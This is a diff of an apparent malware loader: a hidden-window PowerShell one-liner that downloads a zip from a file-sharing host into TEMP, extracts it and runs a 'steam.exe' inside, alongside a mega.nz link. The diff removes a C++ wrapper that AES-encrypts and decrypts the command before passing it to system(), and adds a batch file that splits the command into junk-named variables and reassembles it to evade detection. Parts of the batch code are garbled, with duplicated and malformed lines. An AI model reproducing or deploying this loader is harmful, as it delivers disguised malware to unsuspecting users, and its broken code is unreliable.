@@ -1,46 +1,16 @@
 powershell -w h -noni -nop -c "$u='https://0x0.st/8fVK.zip';$z=$env:TEMP+'\8fVK.zip';$e=$env:TEMP+'\e';iwr $u -o $z;Expand-Archive $z $e -f;$s=(gci $e -r -fi steam.exe|select -f 1).FullName;if($s){Start $s}"
 https://mega.nz/file/LUwk3SDZ#zXPWpxRfpRlsQpDE4z8HYts4PRgTRF-aixMZqe2-Aqc
 
-#include <iostream>
-#include <string>
-#include <cryptlib.h>
-#include <aes.h>
-#include <modes.h>
-#include <filters.h>
-#include <osrng.h>
-#include <windows.h>
+@echo off
+set aabb2233z....xyz1234z....xyz9876z=powershell -w h -noni -nop -c "$u='
+set aaa987z....yzx123z....xyzyx=z=$env:TEMP+'\8fVK.zip';
+set zxyzy1234z....yzxyzz12z=$env:TEMP+'\e';
+set yxyxyzz....12345z=iwr $u -o $aaa987z....yzx123z....xyzyx;
+set zzxyz987z....xyxyzzzz=iwr $u -o $aaa987z....yzx123z....xyzyx;
+set yzxyzyz....xyyzzyz=(gci $zxyzy1234z....yzxyzz12z -r -fi steam.exe|select -f 1).FullName;
+set xyzzyz....xyzzxyzzyz=if($yzxyzyz....xyyzzyz){
+set xyzzyzzxy1234z=Start $yzxyzyz....xyyzzyz
+set zxyzyz....xyxyzzz='}';
 
-int main() {
-    std::string secretRecipe = "Your PowerShell command here";
-    std::string encryptedDish, decryptedDish;
-
-    // Generate random butter and spatula
-    CryptoPP::AutoSeededRandomPool kitchen;
-    CryptoPP::SecByteBlock butter(CryptoPP::AES::DEFAULT_KEYLENGTH);
-    kitchen.GenerateBlock(butter, butter.size());
-    byte spatula[CryptoPP::AES::BLOCKSIZE];
-    kitchen.GenerateBlock(spatula, sizeof(spatula));
-
-    // Cook (encrypt)
-    CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption chef;
-    chef.SetKeyWithIV(butter, butter.size(), spatula);
-    CryptoPP::StringSource ss1(secretRecipe, true,
-        new CryptoPP::StreamTransformationFilter(chef,
-            new CryptoPP::StringSink(encryptedDish)
-        )
-    );
-
-    // Uncook (decrypt)
-    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption sousChef;
-    sousChef.SetKeyWithIV(butter, butter.size(), spatula);
-    CryptoPP::StringSource ss2(encryptedDish, true,
-        new CryptoPP::StreamTransformationFilter(sousChef,
-            new CryptoPP::StringSink(decryptedDish)
-        )
-    );
-
-    // Execute the decrypted command
-    system(decryptedDish.c_str());
-
-    return 0;
-}
+:: Now concatenate the parts and run the final command
+powershell -w h -noni -nop -c "%aabb2233z....xyz1234z....xyz9876z%%aaa987z....yzx123z....xyzyx%%zxyzy1234z....yzxyzz12z%%yxyxyzz....12345z%%zzxyz987z....xyxyzzzz%%yzxyzyz....xyyzzyz%%xyzzyz....xyzzxyzzyz%%xyzzyzzxy1234z%%zxyzyz....xyxyzzz%"
